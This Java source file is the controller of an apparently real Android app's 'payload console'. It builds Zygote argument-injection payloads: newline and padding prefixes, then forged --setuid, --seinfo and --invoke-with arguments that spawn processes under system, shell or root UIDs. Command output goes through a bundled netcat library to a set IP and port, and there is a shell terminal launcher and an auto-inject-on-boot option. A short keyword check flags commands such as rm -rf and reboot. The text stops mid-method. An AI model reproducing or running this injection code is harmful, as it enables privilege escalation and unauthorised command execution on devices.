package com.wqry085.deployesystem;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RadioButton;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.preference.PreferenceManager;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.snackbar.Snackbar;
import com.google.android.material.textfield.TextInputLayout;
import com.wqry085.deployesystem.sockey.ZygoteControlClient;
import com.wqry085.deployesystem.sockey.ZygoteControlListener;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import rikka.shizuku.Shizuku;

/**
 * 载荷控制台 - MIUIx 卡片风格重构版
 */
public class ZygoteFragment extends Fragment {

    private static final String TAG = "ZygoteFragment";

    // 配置项 key（SharedPreferences 持久化）
    private static final String PREFS_NAME = "zygote_config";
    private static final String KEY_IP = "ip_address";
    private static final String KEY_PORT = "server_port";
    private static final String KEY_COMMAND = "command_input";
    private static final String KEY_SETUID = "setuid_input";
    private static final String KEY_SETGID = "setgid_input";
    private static final String KEY_SETGROUP = "setgroup_input";
    private static final String KEY_SELINUX = "setselinux_input";
    private static final String KEY_NICENAME = "nice_name_input";
    private static final String KEY_RUNTIME_FLAGS = "runtime_flags_list";
    private static final String KEY_ZYG1 = "zyg1";
    private static final String KEY_ZYG2 = "zyg2";
    private static final String KEY_ZYG3 = "zyg3";
    private static final String KEY_MULTI_SELECT = "multi_select_preference";

    // 默认值
    private static final String DEFAULT_IP = "0.0.0.0";
    private static final String DEFAULT_IP_SHOW = "127.0.0.1";
    private static final int DEFAULT_PORT = 9981;
    private static final int DEFAULT_ZYG1 = 5;
    private static final int DEFAULT_ZYG2 = 0;
    private static final int DEFAULT_ZYG3 = 4;

    // 彩蛋
    private static final String EASTER_EGG = "hello dream";

    // UI 控件
    private TextView statusValue;
    private TextView logValue;
    private TextView logValueFull;
    private android.widget.ImageButton btnExpandLog;
    private androidx.core.widget.NestedScrollView logScroll;
    private boolean isLogExpanded = false;

    // 静态日志缓冲（供预设页等跨页读取输出）
    public static volatile String sLastLog = "";
    private TextView ipValue;
    private TextView portValue;
    private TextView commandValue;
    private TextView appSelectorValue;
    private TextView uidValue;
    private TextView gidValue;
    private TextView groupsValue;
    private TextView selinuxValue;
    private TextView niceNameValue;
    private TextView runtimeFlagsValue;
    private TextView mountOptionsValue;
    private LinearLayout advancedPanel;
    private ImageView advancedArrow;
    private TextView presetStatus;
    private com.google.android.material.materialswitch.MaterialSwitch bootAutoSwitch;

    private SharedPreferences prefs;
    private ExecutorService executor;
    private ServerThread serverThread;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isAdvancedExpanded = false;
    private volatile String lastReceivedMessage;

    private enum ValueType {
        DIGITS, NON_SPACE
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_zygote_miuix, container, false);
        if (getActivity() != null) {
            prefs = getActivity().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        }
        bindViews(view);
        setupListeners(view);
        initValues();
        disableMiuiOptimization();
        return view;
    }

    private void bindViews(View view) {
        statusValue = view.findViewById(R.id.status_value);
        logValue = view.findViewById(R.id.log_value);
        logValueFull = view.findViewById(R.id.log_value_full);
        btnExpandLog = view.findViewById(R.id.btn_expand_log);
        logScroll = view.findViewById(R.id.log_scroll);
        ipValue = view.findViewById(R.id.ip_value);
        portValue = view.findViewById(R.id.port_value);
        commandValue = view.findViewById(R.id.command_value);
        appSelectorValue = view.findViewById(R.id.app_selector_value);
        uidValue = view.findViewById(R.id.uid_value);
        gidValue = view.findViewById(R.id.gid_value);
        groupsValue = view.findViewById(R.id.groups_value);
        selinuxValue = view.findViewById(R.id.selinux_value);
        niceNameValue = view.findViewById(R.id.nice_name_value);
        runtimeFlagsValue = view.findViewById(R.id.runtime_flags_value);
        mountOptionsValue = view.findViewById(R.id.mount_options_value);
        advancedPanel = view.findViewById(R.id.advanced_panel);
        advancedArrow = view.findViewById(R.id.advanced_arrow);
        presetStatus = view.findViewById(R.id.preset_status);
        bootAutoSwitch = view.findViewById(R.id.switch_boot_auto);
    }

    private void initValues() {
        ipValue.setText(prefs.getString(KEY_IP, DEFAULT_IP_SHOW));
        portValue.setText(prefs.getString(KEY_PORT, String.valueOf(DEFAULT_PORT)));
        commandValue.setText(prefs.getString(KEY_COMMAND, "id"));
        uidValue.setText(prefs.getString(KEY_SETUID, "1000"));
        gidValue.setText(prefs.getString(KEY_SETGID, "1000"));
        groupsValue.setText(prefs.getString(KEY_SETGROUP, "9997"));
        selinuxValue.setText(prefs.getString(KEY_SELINUX,
                "platform:privapp:targetSdkVersion=29:complete"));
        niceNameValue.setText(prefs.getString(KEY_NICENAME, "zYg0te"));
        runtimeFlagsValue.setText(prefs.getString(KEY_RUNTIME_FLAGS, "43267"));
        logValue.setText(getString(R.string.zygote_fragment_no_logs));
        executor = Executors.newSingleThreadExecutor();

        // 初始化挂载选项摘要
        String[] options = getResources().getStringArray(R.array.multi_select_options);
        String[] values = getResources().getStringArray(R.array.multi_select_values);
        java.util.Set<String> selected = prefs.getStringSet(KEY_MULTI_SELECT, new java.util.HashSet<>());
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < values.length; i++) {
            if (selected.contains(values[i])) {
                if (sb.length() > 0) sb.append(" ");
                sb.append(options[i]);
            }
        }
        if (mountOptionsValue != null) {
            mountOptionsValue.setText(sb.length() == 0 ? "未选择" : sb.toString());
        }
    }

    private void setupListeners(View root) {
        if (root == null) return;

        // 日志展开/收起
        if (btnExpandLog != null) {
            btnExpandLog.setOnClickListener(v -> toggleLogExpanded());
        }

        root.findViewById(R.id.row_ip).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_server_ip), KEY_IP, ipValue, DEFAULT_IP_SHOW, true));
        root.findViewById(R.id.row_port).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_server_port), KEY_PORT, portValue, String.valueOf(DEFAULT_PORT), true));
        root.findViewById(R.id.row_command).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_command_input), KEY_COMMAND, commandValue, "id", false));
        root.findViewById(R.id.row_uid).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_uid_input), KEY_SETUID, uidValue, "1000", true));
        root.findViewById(R.id.row_uid).setOnLongClickListener(v -> {
            showUidQuickSelect();
            return true;
        });
        root.findViewById(R.id.row_gid).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_gid_input), KEY_SETGID, gidValue, "1000", true));
        root.findViewById(R.id.row_groups).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_group_input), KEY_SETGROUP, groupsValue, "9997", true));
        root.findViewById(R.id.row_app_selector).setOnClickListener(v -> showAppSelectorBottomSheet());
        root.findViewById(R.id.row_start).setOnClickListener(v -> startServer());
        root.findViewById(R.id.row_stop).setOnClickListener(v -> stopServer());
        root.findViewById(R.id.row_terminal).setOnClickListener(v -> openTerminalActivity());
        root.findViewById(R.id.row_execute).setOnClickListener(v -> handleExecuteClick());
        root.findViewById(R.id.row_advanced).setOnClickListener(v -> toggleAdvancedSettings());
        root.findViewById(R.id.row_selinux).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_selinux_policy), KEY_SELINUX, selinuxValue,
                "platform:privapp:targetSdkVersion=29:complete", false));
        root.findViewById(R.id.row_nice_name).setOnClickListener(v -> showEditDialog(
                getString(R.string.pref_nice_name), KEY_NICENAME, niceNameValue, "zYg0te", false));
        root.findViewById(R.id.row_runtime_flags).setOnClickListener(v -> showRuntimeFlagsDialog());
        root.findViewById(R.id.row_mount_options).setOnClickListener(v -> showMountOptionsDialog());
        root.findViewById(R.id.row_remote_terminal).setOnClickListener(v -> handleShellTerminalClick());
        root.findViewById(R.id.row_save_preset).setOnClickListener(v -> saveCurrentAsPreset());
        root.findViewById(R.id.row_run_preset).setOnClickListener(v -> openPresetManager());

        // 开机自启动开关
        bootAutoSwitch.setChecked(PayloadPresetManager.isBootAutoInjectEnabled(getContext()));
        bootAutoSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            PayloadPresetManager.setBootAutoInjectEnabled(getContext(), isChecked);
            showToast(isChecked ? "Auto-inject on boot enabled" : "Auto-inject on boot disabled");
        });

        // 显示预设状态
        updatePresetStatus();
    }

    private void updatePresetStatus() {
        if (presetStatus == null) return;
        int count = PayloadPresetManager.getPresets(getContext()).size();
        if (count > 0) {
            presetStatus.setText("(" + count + ")");
            presetStatus.setTextColor(getResources().getColor(R.color.cyber_green, null));
        } else {
            presetStatus.setText("");
        }
    }

    private void openPresetManager() {
        PresetManagerBottomSheet sheet = new PresetManagerBottomSheet();
        sheet.setOnChangedCallback(this::updatePresetStatus);
        sheet.setPayloadProvider(this::buildCurrentPayload);
        sheet.show(getParentFragmentManager(), "preset_manager");
    }

    private void saveCurrentAsPreset() {
        Context context = getActivity();
        if (context == null) return;

        String payload = buildCurrentPayload();
        if (payload == null) {
            showToast("Failed to build payload");
            return;
        }

        // 弹出命名对话框
        View dialogView = LayoutInflater.from(context).inflate(R.layout.dialog_single_input, null);
        TextInputLayout til = dialogView.findViewById(R.id.text_input_layout);
        EditText editText = til.getEditText();
        til.setHint("输入预设名称");
        editText.setText(commandValue.getText().toString());
        editText.setSelection(editText.getText().length());

        new MaterialAlertDialogBuilder(context)
                .setTitle("保存为预设")
                .setView(dialogView)
                .setPositiveButton("保存", (dialog, which) -> {
                    if (editText == null) return;
                    String name = editText.getText().toString().trim();
                    if (name.isEmpty()) {
                        til.setError("请输入名称");
                        return;
                    }
                    String summary = buildSummary();
                    PayloadPresetManager.addPreset(context, name, payload, summary);
                    // 保存挂载选项到最新预设
                    java.util.List<PayloadPresetManager.Preset> list = PayloadPresetManager.getPresets(context);
                    if (!list.isEmpty()) {
                        PayloadPresetManager.Preset latest = list.get(0);
                        latest.mountOptions = new java.util.HashSet<>(prefs.getStringSet(KEY_MULTI_SELECT, new java.util.HashSet<>()));
                        PayloadPresetManager.updatePresetFull(context, latest.id, latest);
                    }
                    updatePresetStatus();
                    showToast(getString(R.string.preset_saved));
                })
                .setNegativeButton("取消", (dialog, which) -> dialog.dismiss())
                .show();
    }

    private String buildSummary() {
        try {
            return "命令: " + commandValue.getText()
                    + " | UID: " + uidValue.getText()
                    + " | " + niceNameValue.getText();
        } catch (Exception e) {
            return "自定义参数";
        }
    }

    private String buildCurrentPayload() {
        String command = commandValue.getText().toString();
        try {
            String payload = buildExecutePayload(command);
            return payload;
        } catch (Exception e) {
            Log.e(TAG, "Failed to build payload", e);
            return null;
        }
    }

    private void runPresetPayload() {
        Context context = getActivity();
        if (context == null) return;

        if (!PayloadPresetManager.hasValidPayload(context)) {
            showToast(getString(R.string.preset_empty));
            return;
        }

        String result = PayloadPresetManager.injectBootPreset(context);
        if (result == null) {
            showSnackbar(getString(R.string.payload_sign));
        } else {
            showToast("Inject failed: " + result);
        }
    }

    // UID 快捷选择
    private void showUidQuickSelect() {
        Context context = getActivity();
        if (context == null) return;

        String[] items = {
                "1000 - system",
                "2000 - shell",
                "0 - root (危险)",
                "9997 - everybody",
                "应用 UID (选择器)"
        };

        new MaterialAlertDialogBuilder(context)
                .setTitle("快捷选择 UID")
                .setItems(items, (dialog, which) -> {
                    String value;
                    switch (which) {
                        case 0: value = "1000"; break;
                        case 1: value = "2000"; break;
                        case 2: value = "0"; break;
                        case 3: value = "9997"; break;
                        default:
                            showAppSelectorBottomSheet();
                            return;
                    }
                    uidValue.setText(value);
                    gidValue.setText(value);
                    prefs.edit().putString(KEY_SETUID, value).putString(KEY_SETGID, value).apply();
                })
                .show();
    }

    // ==================== 对话框 ====================

    private void showEditDialog(String title, final String key, final TextView target,
                                String defaultValue, final boolean numeric) {
        Context context = getActivity();
        if (context == null) return;

        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(context);
        builder.setTitle(title);

        View dialogView = LayoutInflater.from(context).inflate(R.layout.dialog_single_input, null);
        TextInputLayout til = dialogView.findViewById(R.id.text_input_layout);
        EditText editText = til.getEditText();
        if (editText != null) {
            editText.setText(target.getText());
            editText.setSelection(editText.getText().length());
        }
        builder.setView(dialogView);

        builder.setPositiveButton(getString(R.string.ok_text), (dialog, which) -> {
            if (editText == null) return;
            String value = editText.getText().toString().trim();
            if (value.isEmpty()) {
                til.setError(getString(R.string.input_empty));
                return;
            }
            if (numeric && !isValidNumeric(value)) {
                showToast("Invalid number");
                return;
            }
            if (KEY_IP.equals(key) && !isValidIp(value)) {
                showToast(getString(R.string.invalid_ip));
                return;
            }
            if (KEY_PORT.equals(key)) {
                try {
                    int port = Integer.parseInt(value);
                    if (port < 1024 || port > 65535) {
                        showToast(getString(R.string.port_range));
                        return;
                    }
                } catch (NumberFormatException e) {
                    showToast(getString(R.string.invalid_port));
                    return;
                }
            }
            target.setText(value);
            prefs.edit().putString(key, value).apply();
            appendLog(title + ": " + value);
        });

        builder.setNegativeButton(getString(R.string.cancel), (dialog, which) -> dialog.dismiss());
        builder.show();
    }

    private void showRuntimeFlagsDialog() {
        Context context = getActivity();
        if (context == null) return;

        String[] entries = getResources().getStringArray(R.array.runtime_flags_entries);
        String[] values = getResources().getStringArray(R.array.runtime_flags_values);
        String current = runtimeFlagsValue.getText().toString();

        LinearLayout listLayout = new LinearLayout(context);
        listLayout.setOrientation(LinearLayout.VERTICAL);
        listLayout.setPadding(dp(8), dp(8), dp(8), dp(8));

        android.widget.RadioGroup radioGroup = new android.widget.RadioGroup(context);
        radioGroup.setOrientation(android.widget.RadioGroup.VERTICAL);
        listLayout.addView(radioGroup);

        int checkedIndex = 0;
        for (int i = 0; i < values.length; i++) {
            if (values[i].equals(current)) {
                checkedIndex = i;
                break;
            }
        }

        for (int i = 0; i < entries.length; i++) {
            View item = LayoutInflater.from(context).inflate(R.layout.item_radio_option, radioGroup, false);
            TextView optionText = item.findViewById(R.id.option_text);
            RadioButton radio = item.findViewById(R.id.option_radio);

            optionText.setText(entries[i]);
            final int index = i;

            item.setOnClickListener(v -> {
                radio.setChecked(true);
                radioGroup.clearCheck();
                radio.setChecked(true);
                String value = values[index];
                runtimeFlagsValue.setText(value);
                prefs.edit().putString(KEY_RUNTIME_FLAGS, value).apply();
                appendLog(getString(R.string.pref_runtime_flags) + ": " + entries[index]);
                if (radioGroup.getTag() != null && radioGroup.getTag() instanceof android.app.Dialog) {
                    ((android.app.Dialog) radioGroup.getTag()).dismiss();
                }
            });

            radio.setChecked(i == checkedIndex);
            radioGroup.addView(item);
        }

        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(context);
        builder.setTitle(getString(R.string.pref_runtime_flags_dialog));
        builder.setView(listLayout);
        builder.setNegativeButton(getString(R.string.cancel), (dialog, which) -> dialog.dismiss());

        android.app.Dialog dialog = builder.show();
        radioGroup.setTag(dialog);
    }

    // Zygote 配置参数（挂载选项）多选对话框
    private void showMountOptionsDialog() {
        Context context = getActivity();
        if (context == null) return;

        String[] options = getResources().getStringArray(R.array.multi_select_options);
        String[] values = getResources().getStringArray(R.array.multi_select_values);

        // 读取当前已选
        java.util.Set<String> selected = prefs.getStringSet(KEY_MULTI_SELECT, new java.util.HashSet<>());
        boolean[] checked = new boolean[options.length];
        for (int i = 0; i < values.length; i++) {
            checked[i] = selected.contains(values[i]);
        }

        // 自定义内容：顶部排错提示 + 可滚动多选列表（避免 setMessage 与 setMultiChoiceItems 冲突）
        LinearLayout content = new LinearLayout(context);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(dp(20), dp(8), dp(20), dp(4));

        TextView tip = new TextView(context);
        tip.setText("⚠️ 排错提示：若孵化进程 ls /sdcard 提示 No such file or directory，\n说明未勾选 --mount-external-* 选项，新进程未挂载 /sdcard。\n请勾选 --mount-external-full 后重新注入。");
        tip.setTextSize(12f);
        tip.setTextColor(context.getColor(R.color.md_theme_light_error));
        tip.setLineSpacing(1.2f, 1.2f);
        tip.setPadding(0, 0, 0, dp(12));
        content.addView(tip);

        // 选项列表（可滚动）
        LinearLayout listLayout = new LinearLayout(context);
        listLayout.setOrientation(LinearLayout.VERTICAL);

        for (int i = 0; i < options.length; i++) {
            final int index = i;
            androidx.appcompat.widget.AppCompatCheckBox cb = new androidx.appcompat.widget.AppCompatCheckBox(context);
            cb.setText(options[i]);
            cb.setTextSize(14f);
            cb.setChecked(checked[i]);
            cb.setPadding(0, dp(6), 0, dp(6));
            cb.setOnCheckedChangeListener((buttonView, isChecked) -> checked[index] = isChecked);
            listLayout.addView(cb);
        }

        // 用 ScrollView 包裹列表，支持滚动查看全部选项（固定高度，超出可滚动）
        android.widget.ScrollView scrollView = new android.widget.ScrollView(context);
        scrollView.setLayoutParams(new android.widget.LinearLayout.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                dp(260)));
        scrollView.addView(listLayout);
        content.addView(scrollView);

        new MaterialAlertDialogBuilder(context)
                .setTitle(getString(R.string.pref_zygote_config_dialog))
                .setView(content)
                .setPositiveButton("确定", (dialog, which) -> {
                    java.util.Set<String> newSelected = new java.util.HashSet<>();
                    for (int i = 0; i < values.length; i++) {
                        if (checked[i]) {
                            newSelected.add(values[i]);
                        }
                    }
                    prefs.edit().putStringSet(KEY_MULTI_SELECT, newSelected).apply();
                    updateMountOptionsSummary(options, values, newSelected);
                })
                .setNegativeButton("取消", (dialog, which) -> dialog.dismiss())
                .show();
    }

    private void updateMountOptionsSummary(String[] options, String[] values, java.util.Set<String> selected) {
        if (mountOptionsValue == null) return;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < values.length; i++) {
            if (selected.contains(values[i])) {
                if (sb.length() > 0) sb.append(" ");
                sb.append(options[i]);
            }
        }
        mountOptionsValue.setText(sb.length() == 0 ? "未选择" : sb.toString());
        appendLog("Zygote 配置: " + (sb.length() == 0 ? "无" : sb.toString()));
    }

    private void toggleAdvancedSettings() {
        isAdvancedExpanded = !isAdvancedExpanded;
        advancedPanel.setVisibility(isAdvancedExpanded ? View.VISIBLE : View.GONE);
        if (advancedArrow != null) {
            advancedArrow.setRotation(isAdvancedExpanded ? 90f : 0f);
        }
    }

    // ==================== 操作处理 ====================

    private void handleExecuteClick() {
        String command = commandValue.getText().toString();

        if (EASTER_EGG.equalsIgnoreCase(command)) {
            openHelloDreamActivity();
            return;
        }

        if (!validateInputs()) {
            return;
        }

        final String payload = buildExecutePayload(command);
        if (payload == null) {
            return;
        }

        // 🔒 硬性拦截：重启类命令 100% 卡开机，任何确认都不放行
        String rebootReason = PayloadGuard.findRebootReason(command);
        if (rebootReason != null) {
            showToast(rebootReason + "，已阻止执行");
            appendLog("🚫 已拦截: " + rebootReason);
            appendLog("   原因: 注入后设置未及时重置，设备重启将 100% 卡开机");
            MaterialDialogHelper.showSimpleDialog(getActivity(),
                    "已阻止执行", PayloadGuard.bootloopWarning());
            return;
        }

        // 危险命令：保留简短的二次确认（不预览 payload），避免误触
        if (isRiskyPayload(command)) {
            Context context = getActivity();
            if (context == null) return;
            new MaterialAlertDialogBuilder(context)
                    .setTitle("危险操作确认")
                    .setMessage(buildRiskDetail(command) + "\n\n确定要执行该命令吗？")
                    .setPositiveButton("执行", (dialog, which) -> {
                        runPayload(payload);
                        showSnackbar(getString(R.string.payload_sign));
                    })
                    .setNegativeButton("取消", (dialog, which) -> dialog.dismiss())
                    .show();
            return;
        }

        // 普通命令：直接执行
        runPayload(payload);
        showSnackbar(getString(R.string.payload_sign));
    }

    private boolean isRiskyPayload(String command) {
        String uid = uidValue.getText().toString();
        if (uid.equals("0") || uid.equals("2000")) return true;
        if (command.contains("rm -rf") || command.contains("format")
                || command.contains("wipe") || command.contains("reboot")) return true;
        return false;
    }

    /** 构建风险明细（危险操作的具体原因） */
    private String buildRiskDetail(String command) {
        StringBuilder sb = new StringBuilder("⚠ 风险项：\n");
        String uid = uidValue.getText().toString();
        if (uid.equals("0")) sb.append("· UID=0 (root 超级权限)\n");
        if (uid.equals("2000")) sb.append("· UID=2000 (shell 权限)\n");
        if (command.contains("rm -rf")) sb.append("· 包含 rm -rf（递归删除）\n");
        if (command.contains("format")) sb.append("· 包含 format（格式化）\n");
        if (command.contains("wipe")) sb.append("· 包含 wipe（擦除）\n");
        if (command.contains("reboot")) sb.append("· 包含 reboot（重启设备）\n");
        return sb.toString().trim();
    }

    private void handleShellTerminalClick() {
        String uidStr = uidValue.getText().toString();

        MaterialDialogHelper.showConfirmDialog(getActivity(),
            getString(R.string.create_remote),
            String.format(getString(R.string.create_msg), uidStr),
            (dialog, which) -> {
                if (!validateInputs()) return;

                String payload = buildShellPayload(uidStr);
                if (payload != null) {
                    runPayload(payload);
                    MaterialDialogHelper.showSimpleDialog(getActivity(),
                        getString(R.string.create_done),
                        getString(R.string.success_hint));
                }
            });
    }

    // ==================== Payload 构建 ====================

    @Nullable
    private String buildExecutePayload(String command) {
        String sanitizedCommand = sanitizeShellCommand(command);
        String basePayload = getBasePayload();
        String ip = ipValue.getText().toString();
        String port = portValue.getText().toString();
        String nativeLibDir = getNativeLibraryDir();

        if (basePayload == null || nativeLibDir == null) {
            return null;
        }

        if (isAndroid12To13()) {
            return basePayload +
                "/system/bin/logwrapper echo zYg0te $(" + sanitizedCommand +
                " | " + nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ")" +
                getPayloadBuffer();
        } else {
            return basePayload +
                "echo \"$(" + sanitizedCommand + ")\" | " +
                nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ";" +
                getPayloadBuffer();
        }
    }

    @Nullable
    private String buildShellPayload(String uidStr) {
        String basePayload = getBasePayload();
        String nativeLibDir = getNativeLibraryDir();

        if (basePayload == null || nativeLibDir == null) {
            return null;
        }

        if (isAndroid12To13()) {
            return basePayload +
                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " +
                nativeLibDir + "/libzygote_term.so " + uidStr + ")" +
                getPayloadBuffer();
        } else {
            return basePayload +
                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uidStr + ");" +
                getPayloadBuffer();
        }
    }

    @Nullable
    private String buildAppDataPayload(int uid, String packageName) {
        String basePayload = getBasePayload();
        String nativeLibDir = getNativeLibraryDir();

        if (basePayload == null || nativeLibDir == null) {
            return null;
        }

        String appDir = "/data/data/" + sanitizePackageName(packageName) + ":56423";

        if (isAndroid12To13()) {
            return basePayload +
                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " +
                nativeLibDir + "/libzygote_term.so " + uid + " --app-dir=" + appDir + ")" +
                getPayloadBuffer();
        } else {
            return basePayload +
                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uid +
                " --app-dir=" + appDir + ");" +
                getPayloadBuffer();
        }
    }

    @Nullable
    private String getBasePayload() {
        try {
            String rawPayload = generateRawPayload();

            String uid = uidValue.getText().toString();
            String gid = gidValue.getText().toString();
            String selinux = selinuxValue.getText().toString();
            String niceName = niceNameValue.getText().toString();
            String runtimeFlags = runtimeFlagsValue.getText().toString();

            return replaceAllParameters(rawPayload, uid, gid, selinux, niceName, runtimeFlags);
        } catch (Exception e) {
            Log.e(TAG, "Failed to get base payload", e);
            showErrorDialog("Payload Generation Failed", e.getMessage());
            return null;
        }
    }

    private String generateRawPayload() {
        int zyg1Count = DEFAULT_ZYG1;
        int zyg2Count = DEFAULT_ZYG2;

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
            zyg1Count = safeParseInt(prefs.getString(KEY_ZYG1, ""), DEFAULT_ZYG1);
            zyg2Count = safeParseInt(prefs.getString(KEY_ZYG2, ""), DEFAULT_ZYG2);
        }

        StringBuilder payload = new StringBuilder();

        for (int i = 0; i < zyg1Count; i++) {
            payload.append("\n");
        }

        char[] padding = new char[zyg2Count];
        Arrays.fill(padding, 'A');
        payload.append(padding);

        String niceName = niceNameValue.getText().toString();
        String runtimeFlags = runtimeFlagsValue.getText().toString();

        payload.append(ZygoteArguments.CALCULATE)
               .append(ZygoteArguments.SET_UID)
               .append(ZygoteArguments.SET_GID)
               .append(ZygoteArguments.ARGS)
               .append(ZygoteArguments.SEINFN)
               .append(ZygoteArguments.RUNTIME_FLAGS).append(runtimeFlags).append("\n")
               .append(ZygoteArguments.PROC_NAME).append(niceName).append("\n")
               .append(ZygoteArguments.EXEC_WITH);

        String result = payload.toString();

        Context context = getActivity();
        if (context != null) {
            String[] extraParams = getMultiSelectedTexts(context, KEY_MULTI_SELECT);
            result = insertParamsAfter(result, "--runtime-args", extraParams);

            String groups = prefs.getString(KEY_SETGROUP, "");
            if (groups != null && !groups.isEmpty()) {
                String[] groupParam = {"--setgroups=" + sanitizeNumericList(groups)};
                result = insertParamsAfter(result, "--setgid=", groupParam);
            }
        }

        return result;
    }

    private String getPayloadBuffer() {
        int count = DEFAULT_ZYG3;
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
            count = safeParseInt(prefs.getString(KEY_ZYG3, ""), DEFAULT_ZYG3);
        }

        char[] commas = new char[count];
        Arrays.fill(commas, ',');
        return " #" + new String(commas) + "X";
    }

    public static String replaceAllParameters(String originalText,
                                               String newUid,
                                               String newGid,
                                               String newSelinux,
                                               String newNiceName,
                                               String newRuntimeFlags) {
        if (originalText == null) {
            return null;
        }

        String result = originalText;

        if (newUid != null && !newUid.isEmpty()) {
            result = replaceParameter(result, "--setuid=", newUid, ValueType.DIGITS);
        }

        if (newGid != null && !newGid.isEmpty()) {
            result = replaceParameter(result, "--setgid=", newGid, ValueType.DIGITS);
        }

        if (newSelinux != null && !newSelinux.isEmpty()) {
            result = replaceParameter(result, "--seinfo=", newSelinux, ValueType.NON_SPACE);
        }

        if (newNiceName != null && !newNiceName.isEmpty()) {
            result = replaceParameter(result, "--nice-name=", newNiceName, ValueType.NON_SPACE);
        }

        if (newRuntimeFlags != null && !newRuntimeFlags.isEmpty()) {
            result = replaceParameter(result, "--runtime-flags=", newRuntimeFlags, ValueType.DIGITS);
        }

        return result;
    }

    private static String replaceParameter(String text, String paramName,
                                           String newValue, ValueType type) {
        StringBuilder result = new StringBuilder();
        int lastIndex = 0;
        int paramLen = paramName.length();

        while (true) {
            int paramIndex = findExactParameter(text, paramName, lastIndex);
            if (paramIndex == -1) {
                result.append(text, lastIndex, text.length());
                break;
            }

            result.append(text, lastIndex, paramIndex + paramLen);

            int valueStart = paramIndex + paramLen;
            int valueEnd = findValueEnd(text, valueStart, type);

            result.append(newValue);
            lastIndex = valueEnd;
        }

        return result.toString();
    }

    private static int findValueEnd(String text, int start, ValueType type) {
        int end = start;
        while (end < text.length()) {
            char c = text.charAt(end);
            boolean shouldContinue;

            switch (type) {
                case DIGITS:
                    shouldContinue = Character.isDigit(c);
                    break;
                case NON_SPACE:
                    shouldContinue = !Character.isWhitespace(c);
                    break;
                default:
                    shouldContinue = false;
            }

            if (!shouldContinue) break;
            end++;
        }
        return end;
    }

    private static int findExactParameter(String text, String param, int fromIndex) {
        int index = fromIndex;
        while (index < text.length()) {
            int found = text.indexOf(param, index);
            if (found == -1) return -1;

            if (isExactParameterMatch(text, found, param)) {
                return found;
            }
            index = found + 1;
        }
        return -1;
    }

    private static boolean isExactParameterMatch(String text, int index, String param) {
        if (index > 0) {
            char prev = text.charAt(index - 1);
            if (!Character.isWhitespace(prev)) {
                return false;
            }
        }

        return index + param.length() <= text.length() &&
               text.substring(index, index + param.length()).equals(param);
    }

    public String insertParamsAfter(String originalText, String anchorParam, String[] newParams) {
        if (originalText == null || originalText.isEmpty() ||
            newParams == null || newParams.length == 0) {
            return originalText;
        }

        Pattern countPattern = Pattern.compile("(\\d+)");
        Matcher matcher = countPattern.matcher(originalText);

        String updatedText = originalText;
        if (matcher.find()) {
            try {
                int currentCount = Integer.parseInt(matcher.group(1));
                int newCount = currentCount + newParams.length;

                StringBuilder sb = new StringBuilder(originalText);
                sb.replace(matcher.start(), matcher.end(), String.valueOf(newCount));
                updatedText = sb.toString();
            } catch (NumberFormatException e) {
                Log.w(TAG, "Failed to parse parameter count", e);
            }
        } else {
            Log.w(TAG, "No parameter count found in payload");
        }

        String[] lines = updatedText.split("(?<=\n)", -1);
        StringBuilder result = new StringBuilder();
        boolean inserted = false;
        boolean reachedInvokeWith = false;

        for (String line : lines) {
            result.append(line);

            if (!inserted && !reachedInvokeWith && line.contains(anchorParam)) {
                for (String param : newParams) {
                    if (param != null && !param.isEmpty()) {
                        result.append(param).append("\n");
                    }
                }
                inserted = true;
            }

            if (line.contains("--invoke-with")) {
                reachedInvokeWith = true;
            }
        }

        if (!inserted) {
            Log.w(TAG, "Anchor parameter not found: " + anchorParam);
        }

        return result.toString();
    }

    // ==================== 校验与工具 ====================

    private boolean validateInputs() {
        String uid = uidValue.getText().toString();
        if (!isValidNumeric(uid)) {
            showToast("Invalid UID: must be a number");
            return false;
        }

        String gid = gidValue.getText().toString();
        if (!isValidNumeric(gid)) {
